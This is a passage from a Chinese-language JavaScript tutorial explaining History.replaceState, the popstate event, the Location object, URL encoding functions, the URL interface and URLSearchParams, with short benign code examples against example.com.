<p>上面代码中，<code>pushState</code>想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。</p>
<h4 id="History-replaceState"><a href="#History-replaceState" class="headerlink" title="History.replaceState()"></a>History.replaceState()</h4><p><code>History.replaceState()</code>方法用来修改 History 对象的当前记录，其他都与<code>pushState()</code>方法一模一样。</p>
<p>假定当前网页是<code>example.com/example.html</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(&#123;page: 1&#125;, &#39;title 1&#39;, &#39;?page&#x3D;1&#39;)</span><br><span class="line">&#x2F;&#x2F; URL 显示为 http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;1</span><br><span class="line"></span><br><span class="line">history.pushState(&#123;page: 2&#125;, &#39;title 2&#39;, &#39;?page&#x3D;2&#39;);</span><br><span class="line">&#x2F;&#x2F; URL 显示为 http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;2</span><br><span class="line"></span><br><span class="line">history.replaceState(&#123;page: 3&#125;, &#39;title 3&#39;, &#39;?page&#x3D;3&#39;);</span><br><span class="line">&#x2F;&#x2F; URL 显示为 http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;3</span><br><span class="line"></span><br><span class="line">history.back()</span><br><span class="line">&#x2F;&#x2F; URL 显示为 http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;1</span><br><span class="line"></span><br><span class="line">history.back()</span><br><span class="line">&#x2F;&#x2F; URL 显示为 http:&#x2F;&#x2F;example.com&#x2F;example.html</span><br><span class="line"></span><br><span class="line">history.go(2)</span><br><span class="line">&#x2F;&#x2F; URL 显示为 http:&#x2F;&#x2F;example.com&#x2F;example.html?page&#x3D;3</span><br></pre></td></tr></table></figure>

<h3 id="popstate-事件"><a href="#popstate-事件" class="headerlink" title="popstate 事件"></a>popstate 事件</h3><p>每当同一个文档的浏览历史（即<code>history</code>对象）出现变化时，就会触发<code>popstate</code>事件。</p>
<p>注意，仅仅调用<code>pushState()</code>方法或<code>replaceState()</code>方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用<code>History.back()</code>、<code>History.forward()</code>、<code>History.go()</code>方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。</p>
<p>使用的时候，可以为<code>popstate</code>事件指定回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.onpopstate &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;location: &#39; + document.location);</span><br><span class="line">  console.log(&#39;state: &#39; + JSON.stringify(event.state));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 或者</span><br><span class="line">window.addEventListener(&#39;popstate&#39;, function(event) &#123;</span><br><span class="line">  console.log(&#39;location: &#39; + document.location);</span><br><span class="line">  console.log(&#39;state: &#39; + JSON.stringify(event.state));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>回调函数的参数是一个<code>event</code>事件对象，它的<code>state</code>属性指向<code>pushState</code>和<code>replaceState</code>方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的<code>event.state</code>，就是通过<code>pushState</code>和<code>replaceState</code>方法，为当前 URL 绑定的<code>state</code>对象。</p>
<p>这个<code>state</code>对象也可以直接通过<code>history</code>对象读取。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var currentState &#x3D; history.state;</span><br></pre></td></tr></table></figure>

<p>注意，页面第一次加载的时候，浏览器不会触发<code>popstate</code>事件。</p>
<h2 id="Location-对象，URL-对象，URLSearchParams-对象"><a href="#Location-对象，URL-对象，URLSearchParams-对象" class="headerlink" title="Location 对象，URL 对象，URLSearchParams 对象"></a>Location 对象，URL 对象，URLSearchParams 对象</h2><p>URL 是互联网的基础设施之一。浏览器提供了一些原生对象，用来管理 URL。</p>
<h3 id="Location-对象"><a href="#Location-对象" class="headerlink" title="Location 对象"></a>Location 对象</h3><p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>
<h4 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h4><p><code>Location</code>对象提供以下属性。</p>
<ul>
<li><code>Location.href</code>：整个 URL。</li>
<li><code>Location.protocol</code>：当前 URL 的协议，包括冒号（<code>:</code>）。</li>
<li><code>Location.host</code>：主机。如果端口不是协议默认的<code>80</code>和<code>433</code>，则还会包括冒号（<code>:</code>）和端口。</li>
<li><code>Location.hostname</code>：主机名，不包括端口。</li>
<li><code>Location.port</code>：端口号。</li>
<li><code>Location.pathname</code>：URL 的路径部分，从根路径<code>/</code>开始。</li>
<li><code>Location.search</code>：查询字符串部分，从问号<code>?</code>开始。</li>
<li><code>Location.hash</code>：片段字符串部分，从<code>#</code>开始。</li>
<li><code>Location.username</code>：域名前面的用户名。</li>
<li><code>Location.password</code>：域名前面的密码。</li>
<li><code>Location.origin</code>：URL 的协议、主机名和端口。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 当前网址为</span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1</span><br><span class="line">document.location.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1&quot;</span><br><span class="line">document.location.protocol</span><br><span class="line">&#x2F;&#x2F; &quot;http:&quot;</span><br><span class="line">document.location.host</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com:4097&quot;</span><br><span class="line">document.location.hostname</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com&quot;</span><br><span class="line">document.location.port</span><br><span class="line">&#x2F;&#x2F; &quot;4097&quot;</span><br><span class="line">document.location.pathname</span><br><span class="line">&#x2F;&#x2F; &quot;&#x2F;path&#x2F;a.html&quot;</span><br><span class="line">document.location.search</span><br><span class="line">&#x2F;&#x2F; &quot;?x&#x3D;111&quot;</span><br><span class="line">document.location.hash</span><br><span class="line">&#x2F;&#x2F; &quot;#part1&quot;</span><br><span class="line">document.location.username</span><br><span class="line">&#x2F;&#x2F; &quot;user&quot;</span><br><span class="line">document.location.password</span><br><span class="line">&#x2F;&#x2F; &quot;passwd&quot;</span><br><span class="line">document.location.origin</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&quot;</span><br></pre></td></tr></table></figure>

<p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写。</p>
<p>注意，如果对<code>Location.href</code>写入新的 URL 地址，浏览器会立刻跳转到这个新地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 跳转到新网址</span><br><span class="line">document.location.href &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>这个特性常常用于让网页自动滚动到新的锚点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.location.href &#x3D; &#39;#top&#39;;</span><br><span class="line">&#x2F;&#x2F; 等同于</span><br><span class="line">document.location.hash &#x3D; &#39;#top&#39;;</span><br></pre></td></tr></table></figure>

<p>直接改写<code>location</code>，相当于写入<code>href</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.location &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#39;;</span><br><span class="line">&#x2F;&#x2F; 等同于</span><br><span class="line">document.location.href &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>另外，<code>Location.href</code>属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的<code>Location.href</code>属性，导致后者的网址跳转。<code>Location</code>的其他属性都不允许跨域写入。</p>
<h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p><strong>（1）Location.assign()</strong></p>
<p><code>assign</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 跳转到新的网址</span><br><span class="line">document.location.assign(&#39;http:&#x2F;&#x2F;www.example.com&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>（2）Location.replace()</strong></p>
<p><code>replace</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>
<p>它与<code>assign</code>方法的差异在于，<code>replace</code>会在浏览器的浏览历史<code>History</code>里面删除当前网址，也就是说，一旦使用了该方法，后退按钮就无法回到当前网页了，相当于在浏览历史里面，使用新的 URL 替换了老的 URL。它的一个应用是，当脚本发现当前是移动设备时，就立刻跳转到移动版网页。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 跳转到新的网址</span><br><span class="line">document.location.replace(&#39;http:&#x2F;&#x2F;www.example.com&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>（3）Location.reload()</strong></p>
<p><code>reload</code>方法使得浏览器重新加载当前网址，相当于按下浏览器的刷新按钮。</p>
<p>它接受一个布尔值作为参数。如果参数为<code>true</code>，浏览器将向服务器重新请求这个网页，并且重新加载后，网页将滚动到头部（即<code>scrollTop === 0</code>）。如果参数是<code>false</code>或为空，浏览器将从本地缓存重新加载该网页，并且重新加载后，网页的视口位置是重新加载前的位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 向服务器重新请求当前网址</span><br><span class="line">window.location.reload(true);</span><br></pre></td></tr></table></figure>

<p><strong>（4）Location.toString()</strong></p>
<p><code>toString</code>方法返回整个 URL 字符串，相当于读取<code>Location.href</code>属性。</p>
<h3 id="URL-的编码和解码"><a href="#URL-的编码和解码" class="headerlink" title="URL 的编码和解码"></a>URL 的编码和解码</h3><p>网页的 URL 只能包含合法的字符。合法字符分成两类。</p>
<ul>
<li>URL 元字符：分号（<code>;</code>），逗号（<code>,</code>），斜杠（<code>/</code>），问号（<code>?</code>），冒号（<code>:</code>），at（<code>@</code>），<code>&amp;</code>，等号（<code>=</code>），加号（<code>+</code>），美元符号（<code>$</code>），井号（<code>#</code>）</li>
<li>语义字符：<code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，连词号（<code>-</code>），下划线（<code>_</code>），点（<code>.</code>），感叹号（<code>!</code>），波浪线（<code>~</code>），星号（<code>*</code>），单引号（<code>&#39;</code>），圆括号（<code>()</code>）</li>
</ul>
<p>除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（<code>%</code>）加上两个大写的十六进制字母。</p>
<p>比如，UTF-8 的操作系统上，<code>http://www.example.com/q=春节</code>这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成<code>http://www.example.com/q=%E6%98%A5%E8%8A%82</code>。其中，“春”转成了<code>%E6%98%A5</code>，“节”转成了<code>%E8%8A%82</code>。这是因为“春”和“节”的 UTF-8 编码分别是<code>E6 98 A5</code>和<code>E8 8A 82</code>，将每个字节前面加上百分号，就构成了 URL 编码。</p>
<p>JavaScript 提供四个 URL 的编码&#x2F;解码方法。</p>
<ul>
<li><code>encodeURI()</code></li>
<li><code>encodeURIComponent()</code></li>
<li><code>decodeURI()</code></li>
<li><code>decodeURIComponent()</code></li>
</ul>
<h4 id="encodeURI"><a href="#encodeURI" class="headerlink" title="encodeURI()"></a>encodeURI()</h4><p><code>encodeURI()</code>方法用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURI(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;春节&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;%E6%98%A5%E8%8A%82&quot;</span><br></pre></td></tr></table></figure>

<h4 id="encodeURIComponent"><a href="#encodeURIComponent" class="headerlink" title="encodeURIComponent()"></a>encodeURIComponent()</h4><p><code>encodeURIComponent()</code>方法用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&#39;春节&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;%E6%98%A5%E8%8A%82&quot;</span><br><span class="line">encodeURIComponent(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;春节&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>encodeURIComponent()</code>会连 URL 元字符一起转义，所以如果转码整个 URL 就会出错。</p>
<h4 id="decodeURI"><a href="#decodeURI" class="headerlink" title="decodeURI()"></a>decodeURI()</h4><p><code>decodeURI()</code>方法用于整个 URL 的解码。它是<code>encodeURI()</code>方法的逆运算。它接受一个参数，就是转码后的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decodeURI(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;%E6%98%A5%E8%8A%82&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;q&#x3D;春节&quot;</span><br></pre></td></tr></table></figure>

<h4 id="decodeURIComponent"><a href="#decodeURIComponent" class="headerlink" title="decodeURIComponent()"></a>decodeURIComponent()</h4><p><code>decodeURIComponent()</code>用于URL 片段的解码。它是<code>encodeURIComponent()</code>方法的逆运算。它接受一个参数，就是转码后的 URL 片段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decodeURIComponent(&#39;%E6%98%A5%E8%8A%82&#39;)</span><br><span class="line">&#x2F;&#x2F; &quot;春节&quot;</span><br></pre></td></tr></table></figure>

<h3 id="URL-接口"><a href="#URL-接口" class="headerlink" title="URL 接口"></a>URL 接口</h3><p>浏览器原生提供<code>URL()</code>接口，它是一个构造函数，用来构造、解析和编码 URL。一般情况下，通过<code>window.URL</code>可以拿到这个构造函数。</p>
<h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p><code>URL()</code>作为构造函数，可以生成 URL 实例。它接受一个表示 URL 的字符串作为参数。如果参数不是合法的 URL，会报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;http:&#x2F;&#x2F;www.example.com&#x2F;index.html&#39;);</span><br><span class="line">url.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;index.html&quot;</span><br></pre></td></tr></table></figure>

<p>上面示例生成了一个 URL 实例，用来代表指定的网址。</p>
<p>除了字符串，<code>URL()</code>的参数也可以是另一个 URL 实例。这时，<code>URL()</code>会自动读取该实例的<code>href</code>属性，作为实际参数。</p>
<p>如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var url1 &#x3D; new URL(&#39;index.html&#39;, &#39;http:&#x2F;&#x2F;example.com&#39;);</span><br><span class="line">url1.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;index.html&quot;</span><br><span class="line"></span><br><span class="line">var url2 &#x3D; new URL(&#39;page2.html&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;page1.html&#39;);</span><br><span class="line">url2.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;page2.html&quot;</span><br><span class="line"></span><br><span class="line">var url3 &#x3D; new URL(&#39;..&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;a&#x2F;b.html&#39;)</span><br><span class="line">url3.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，返回的 URL 实例的路径都是在第二个参数的基础上，切换到第一个参数得到的。最后一个例子里面，第一个参数是<code>..</code>，表示上层路径。</p>
<h4 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h4><p>URL 实例的属性与<code>Location</code>对象的属性基本一致，返回当前 URL 的信息。</p>
<ul>
<li>URL.href：返回整个 URL</li>
<li>URL.protocol：返回协议，以冒号<code>:</code>结尾</li>
<li>URL.hostname：返回域名</li>
<li>URL.host：返回域名与端口，包含<code>:</code>号，默认的80和443端口会省略</li>
<li>URL.port：返回端口</li>
<li>URL.origin：返回协议、域名和端口</li>
<li>URL.pathname：返回路径，以斜杠<code>/</code>开头</li>
<li>URL.search：返回查询字符串，以问号<code>?</code>开头</li>
<li>URL.searchParams：返回一个<code>URLSearchParams</code>实例，该属性是<code>Location</code>对象没有的</li>
<li>URL.hash：返回片段识别符，以井号<code>#</code>开头</li>
<li>URL.password：返回域名前面的密码</li>
<li>URL.username：返回域名前面的用户名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1&#39;);</span><br><span class="line"></span><br><span class="line">url.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1&quot;</span><br><span class="line">url.protocol</span><br><span class="line">&#x2F;&#x2F; &quot;http:&quot;</span><br><span class="line">url.hostname</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com&quot;</span><br><span class="line">url.host</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com:4097&quot;</span><br><span class="line">url.port</span><br><span class="line">&#x2F;&#x2F; &quot;4097&quot;</span><br><span class="line">url.origin</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com:4097&quot;</span><br><span class="line">url.pathname</span><br><span class="line">&#x2F;&#x2F; &quot;&#x2F;path&#x2F;a.html&quot;</span><br><span class="line">url.search</span><br><span class="line">&#x2F;&#x2F; &quot;?x&#x3D;111&quot;</span><br><span class="line">url.searchParams</span><br><span class="line">&#x2F;&#x2F; URLSearchParams &#123;&#125;</span><br><span class="line">url.hash</span><br><span class="line">&#x2F;&#x2F; &quot;#part1&quot;</span><br><span class="line">url.password</span><br><span class="line">&#x2F;&#x2F; &quot;passwd&quot;</span><br><span class="line">url.username</span><br><span class="line">&#x2F;&#x2F; &quot;user&quot;</span><br></pre></td></tr></table></figure>

<p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写，并且会立即生效。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;http:&#x2F;&#x2F;example.com&#x2F;index.html#part1&#39;);</span><br><span class="line"></span><br><span class="line">url.pathname &#x3D; &#39;index2.html&#39;;</span><br><span class="line">url.href &#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;index2.html#part1&quot;</span><br><span class="line"></span><br><span class="line">url.hash &#x3D; &#39;#part2&#39;;</span><br><span class="line">url.href &#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;index2.html#part2&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，改变 URL 实例的<code>pathname</code>属性和<code>hash</code>属性，都会实时反映在 URL 实例当中。</p>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p><strong>（1）URL.createObjectURL()</strong></p>
<p><code>URL.createObjectURL()</code>方法用来为上传&#x2F;下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了<code>File</code>对象或<code>Blob</code>对象的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;div id&#x3D;&quot;display&quot;&#x2F;&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;input</span><br><span class="line">&#x2F;&#x2F;   type&#x3D;&quot;file&quot;</span><br><span class="line">&#x2F;&#x2F;   id&#x3D;&quot;fileElem&quot;</span><br><span class="line">&#x2F;&#x2F;   multiple</span><br><span class="line">&#x2F;&#x2F;   accept&#x3D;&quot;image&#x2F;*&quot;</span><br><span class="line">&#x2F;&#x2F;   onchange&#x3D;&quot;handleFiles(this.files)&quot;</span><br><span class="line">&#x2F;&#x2F;  &gt;</span><br><span class="line">var div &#x3D; document.getElementById(&#39;display&#39;);</span><br><span class="line"></span><br><span class="line">function handleFiles(files) &#123;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; window.URL.createObjectURL(files[i]);</span><br><span class="line">    div.appendChild(img);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>URL.createObjectURL()</code>方法用来为上传的文件生成一个 URL 字符串，作为<code>&lt;img&gt;</code>元素的图片来源。</p>
<p>该方法生成的 URL 就像下面的样子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blob:http:&#x2F;&#x2F;localhost&#x2F;c745ef73-ece9-46da-8f66-ebes574789b1</span><br></pre></td></tr></table></figure>

<p>注意，每次使用<code>URL.createObjectURL()</code>方法，都会在内存里面生成一个 URL 实例。如果不再需要该方法生成的 URL 字符串，为了节省内存，可以使用<code>URL.revokeObjectURL()</code>方法释放这个实例。</p>
<p><strong>（2）URL.revokeObjectURL()</strong></p>
<p><code>URL.revokeObjectURL()</code>方法用来释放<code>URL.createObjectURL()</code>方法生成的 URL 实例。它的参数就是<code>URL.createObjectURL()</code>方法返回的 URL 字符串。</p>
<p>下面为上一段的示例加上<code>URL.revokeObjectURL()</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var div &#x3D; document.getElementById(&#39;display&#39;);</span><br><span class="line"></span><br><span class="line">function handleFiles(files) &#123;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; window.URL.createObjectURL(files[i]);</span><br><span class="line">    div.appendChild(img);</span><br><span class="line">    img.onload &#x3D; function() &#123;</span><br><span class="line">      window.URL.revokeObjectURL(this.src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，一旦图片加载成功以后，为本地文件生成的 URL 字符串就没用了，于是可以在<code>img.onload</code>回调函数里面，通过<code>URL.revokeObjectURL()</code>方法卸载这个 URL 实例。</p>
<h3 id="URLSearchParams-对象"><a href="#URLSearchParams-对象" class="headerlink" title="URLSearchParams 对象"></a>URLSearchParams 对象</h3><h4 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h4><p><code>URLSearchParams</code>对象是浏览器的原生对象，用来构造、解析和处理 URL 的查询字符串（即 URL 问号后面的部分）。</p>
<p>它本身也是一个构造函数，可以生成实例。参数可以为查询字符串，起首的问号<code>?</code>有没有都行，也可以是对应查询字符串的数组或对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 方法一：传入字符串</span><br><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&amp;bar&#x3D;2&#39;);</span><br><span class="line">&#x2F;&#x2F; 等同于</span><br><span class="line">var params &#x3D; new URLSearchParams(document.location.search);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方法二：传入数组</span><br><span class="line">var params &#x3D; new URLSearchParams([[&#39;foo&#39;, 1], [&#39;bar&#39;, 2]]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方法三：传入对象</span><br><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39; : 1 , &#39;bar&#39; : 2&#125;);</span><br></pre></td></tr></table></figure>

<p><code>URLSearchParams</code>会对查询字符串自动编码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: &#39;你好&#39;&#125;);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;%E4%BD%A0%E5%A5%BD&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>foo</code>的值是汉字，<code>URLSearchParams</code>对其自动进行 URL 编码。</p>
<p>浏览器向服务器发送表单数据时，可以直接使用<code>URLSearchParams</code>实例作为表单数据。</p>
